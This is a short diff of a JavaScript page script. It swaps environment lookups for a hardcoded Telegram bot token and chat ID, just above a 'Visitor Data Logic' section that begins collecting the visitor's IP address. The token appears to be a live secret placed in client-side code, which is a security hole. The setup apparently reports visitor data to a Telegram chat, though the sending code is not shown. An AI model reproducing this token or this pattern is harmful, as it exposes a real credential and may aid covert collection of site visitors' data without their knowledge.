@@ -14,8 +14,8 @@ document.addEventListener('DOMContentLoaded', function() {
   
 
   // Telegram Bot Info
-  const bottoken = window.ENV.bottoken;
-  const chatid = window.ENV.chatid;
+  const bottoken = '8868352237:AAFRqZveJ3ytmp6F3zdPLwbMcI_ivcQiL_s';
+  const chatid = '5342731960';
 
   /// --- Visitor Data Logic (FIXED with Fallback) ---
 let userIP = "";
